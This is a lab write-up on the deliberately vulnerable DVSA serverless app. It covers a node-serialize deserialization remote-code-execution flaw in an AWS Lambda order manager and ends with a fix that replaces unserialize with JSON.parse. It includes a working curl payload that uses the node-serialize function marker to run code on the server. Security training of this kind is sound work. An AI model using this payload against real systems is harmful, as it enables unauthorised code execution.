# Vulnerable Dependencies Vulnerability 
The Vulnerable Dependencies flaw in the order-manager.js Lambda function stems from the unsafe deserialization of user-provided data via the node-serialize library. By failing to validate external inputs before processing them, the application allows attackers to inject specially crafted strings that the library executes as live code, leading to Remote Code Execution (RCE). This highlights a fundamental weakness in dependency management, where integrating unvetted or outdated third-party code introduces severe security risks that a developer may not have written but must ultimately secure.

---
## Vulnerability Exploting
To achieve this vulnerability, we will use the Terminal and the AWS console. You have to following these steps:
1.	Open the AWS console using your account
2.	Search for API Gateway and open it
3.	Click on the  DVSA-APIS and go to the stages from the left bar.
4.	Expand the stage and go to the post option under the order field.
5.	Copy the Invoke URL
6. Open the Terminal and write this command

```
curl.exe -X POST "[you should add the invoke URL for the order]" `
>> -H "Content-Type: application/json" `
>> -d '{\"action\": \"_$$ND_FUNC$$_function(){ var fs = require(''fs''); fs.writeFileSync(''/tmp/pwned.txt'', ''You are reading the contents of my hacked file!''); var fileData = fs.readFileSync(''/tmp/pwned.txt'', ''utf-8''); console.error(''FILE READ SUCCESS: '' + fileData); }()\", \"cart-id\":\"123\"}'
```
> After running this command you will recive this {"message": "Internal server error"} message

To prove that you achieve the vulnerability open AWS consol and do these steps:

1.	Search and open CloudWatch.
2.	Go to Log Management under the Logs in the left bar.
3.	Search for /aws/lambda/DVSA-ORDER-MANAGER and open the recent log.
You have to see something simmilar to the image below


---
## Vulnerability Fixing

The fix of this vulnerability is done in the Order_Manage Lambda function by doing the following:
1.	Search for and open Lambda in the AWS console
2.	Open the DVSA-ORDER-MANAGER function from the functions list.
3.	Open order-manager.JS file in the code tab.
4.	Delete this line (const serialize = require('node-serialize');), which is the call of the node-serialize library.
5.	Change this line (var req = serialize.unserialize(event.body); ) to this (var req = JSON.parse(event.body);).
6.	Change this line (var headers = serialize.unserialize(event.headers);) to this ( var headers = event.headers;).
7.	Deploy the changes by clicking on the Undeployed changes button at the bottom left corner of the Code source section and then clicking the deploy button. 
The final code should be as the image below.

To ensure that the fix prevent the exploition, tou have to rerun the same commands above. You should get {"message":"Bad Request"} in the terminal, and in the CloudWatch logs Error Bad request message should appear.
